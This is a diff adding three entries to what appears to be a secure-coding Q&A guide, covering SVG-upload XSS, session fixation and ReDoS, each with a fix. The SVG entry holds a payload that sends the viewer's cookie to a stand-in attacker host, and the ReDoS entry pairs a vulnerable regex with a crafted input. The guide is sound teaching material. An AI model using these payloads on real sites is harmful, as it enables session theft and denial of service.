@@ -1878,4 +1878,87 @@ Because Blind SQL Injection requires no direct data reflection at all — only *
 
 ---
 
+## Beginner — Question 20
+
+**Q20: What is the Content-Type sniffing risk for a file-upload feature accepting SVG files specifically, and how can an SVG — technically an XML-based image format — contain embedded JavaScript, making it a genuine XSS vector despite being "just an image"?**
+
+Unlike a raster image format (PNG, JPEG, which are pure pixel data with no capacity to contain executable code), SVG is an XML-based, text format that can legitimately include a `<script>` element — a browser rendering an "uploaded image" that's actually a maliciously-crafted SVG can execute that embedded JavaScript exactly as if it were any other page script, turning an innocuous-seeming "profile picture upload" feature into a genuine stored-XSS vector.
+
+```xml
+<!-- an "image" file, uploaded as "profile-pic.svg" -- but ACTUALLY contains EXECUTABLE script -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('https://evil-attacker.com/steal?cookie=' + document.cookie); // EXFILTRATES the
+    // VIEWING user's OWN session COOKIE, the MOMENT the "IMAGE" is DISPLAYED in their BROWSER
+  </script>
+</svg>
+```
+
+```text
+A RASTER image (PNG, JPEG): PURE pixel DATA -- STRUCTURALLY incapable of CONTAINING
+  executable CODE -- GENUINELY safe from THIS specific vector
+
+An SVG "image": TEXT-based, XML FORMAT -- CAN legitimately CONTAIN a <script> ELEMENT --
+  a BROWSER rendering it EXECUTES that SCRIPT, EXACTLY as it would ANY other PAGE script --
+  an UPLOADED "image" becomes a GENUINE, WORKING XSS payload
+```
+
+Because SVG's own file format specification permits embedded scripting (a legitimate feature for genuinely interactive vector graphics, but a serious liability for user-uploaded content an application then displays to other users), an application accepting SVG uploads must either sanitize the file's content (stripping any `<script>` elements and event-handler attributes before storage/display) or serve uploaded SVGs with a `Content-Disposition: attachment` header forcing download rather than inline rendering, or simply disallow SVG uploads entirely in favor of raster-only formats.
+
+**Common Pitfall:** treating "image upload" as inherently safe from XSS simply because it's "just a picture," without recognizing that SVG specifically is a text-based, script-capable format fundamentally different from raster image formats — an application accepting SVG uploads and rendering them inline needs explicit sanitization or serving precautions that a PNG/JPEG-only upload feature simply wouldn't need.
+
+---
+
+## Intermediate — Question 21
+
+**Q21: What is Session Fixation, and how does an application's failure to regenerate a session ID after a successful login let an attacker's pre-set session become valid the moment the victim authenticates?**
+
+An attacker can set a *known* session ID on a victim's browser *before* the victim ever logs in (via a crafted link containing a session ID in the URL, or a cookie set from a subdomain the attacker controls) — if the application then simply *authenticates that same, attacker-known session* upon successful login (rather than issuing a genuinely fresh session ID), the attacker's own browser, already holding that identical session ID, instantly gains the victim's authenticated session the moment the victim logs in.
+
+```text
+STEP 1: ATTACKER tricks the VICTIM into visiting "https://example.com/login?sessionId=ATTACKER123"
+  (or sets a COOKIE with THIS value some OTHER way) -- the VICTIM's browser now HOLDS
+  session ID "ATTACKER123," WHICH the ATTACKER ALREADY KNOWS
+
+STEP 2: VICTIM logs IN successfully -- IF the application DOESN'T generate a FRESH session
+  ID at THIS point, the SAME "ATTACKER123" session is NOW MARKED as AUTHENTICATED
+
+STEP 3: the ATTACKER, who ALREADY knew "ATTACKER123" from the VERY START, simply USES that
+  SAME session ID THEMSELVES -- INSTANTLY gaining the VICTIM's OWN, NOW-authenticated session
+```
+
+```text
+The FIX: REGENERATE a BRAND-NEW, UNPREDICTABLE session ID IMMEDIATELY upon SUCCESSFUL
+  authentication -- the OLD (POTENTIALLY attacker-KNOWN) session ID is INVALIDATED, and
+  the NEW one was NEVER known to the ATTACKER AT ALL, CLOSING the entire ATTACK vector
+```
+
+Because the vulnerability specifically depends on the *same* session ID surviving from before login to after, regenerating a genuinely new, unpredictable session ID at the exact moment of successful authentication structurally closes this attack — this is precisely why ASP.NET Core Identity and most modern authentication frameworks automatically regenerate the session/authentication cookie upon login, rather than simply "marking" a pre-existing session as authenticated.
+
+**Common Pitfall:** implementing custom session management that marks an existing session as "authenticated" upon successful login, without generating a genuinely new session identifier at that exact moment — this leaves the application vulnerable to Session Fixation, since any session ID an attacker managed to set on a victim's browser *before* login remains valid and attacker-known even *after* the victim successfully authenticates.
+
+---
+
+## Advanced — Question 20
+
+**Q20: How does ReDoS (covered under Performance as a performance bug) function specifically as a security vulnerability class, letting an attacker deliberately craft input against a known-vulnerable regex pattern to turn a single, cheap request into a genuine denial-of-service attack?**
+
+The performance-focused coverage of ReDoS (covered under Performance) explains the *mechanism* — catastrophic backtracking consuming exponential CPU time — but the security framing emphasizes the *exploitability*: an attacker doesn't need any special access or privileges to trigger it, just the ability to submit ordinary user input to a validation endpoint using a vulnerable regex, making it a genuine, remotely-triggerable denial-of-service vector rather than merely an internal performance concern discovered through profiling.
+
+```csharp
+// a VULNERABLE regex, used for EMAIL validation on a PUBLIC registration FORM
+var pattern = @"^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@)([a-zA-Z0-9])+(([\.]?[a-zA-Z0-9]+))*"; // NESTED quantifiers
+
+// an ATTACKER submits a SINGLE, CAREFULLY crafted "email" via the PUBLIC registration form:
+var maliciousInput = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; // a FEW dozen characters
+// -- this SINGLE, CHEAP-to-SEND request can CONSUME MINUTES of CPU time on the SERVER,
+//    with NO authentication, NO special ACCESS, and NO elevated PRIVILEGES required AT ALL
+```
+
+Because triggering catastrophic backtracking requires nothing beyond ordinary, unauthenticated access to a public-facing input field (a registration form, a search box), any vulnerable regex reachable from untrusted input represents a genuine, remotely-exploitable denial-of-service vulnerability — not merely a latent performance bug that might theoretically surface under unusual load, but an actively exploitable weakness an attacker can trigger deliberately, on demand, with a single cheap request.
+
+**Common Pitfall:** treating ReDoS purely as a performance-tuning concern to address "eventually," rather than recognizing that any vulnerable regex reachable from untrusted, unauthenticated user input is an actively exploitable, remotely-triggerable denial-of-service vulnerability requiring the same urgency as any other security issue — a regex timeout (covered under Performance) or rewriting the vulnerable pattern should be treated as a genuine security fix, not merely a performance nice-to-have.
+
+---
+
 ---
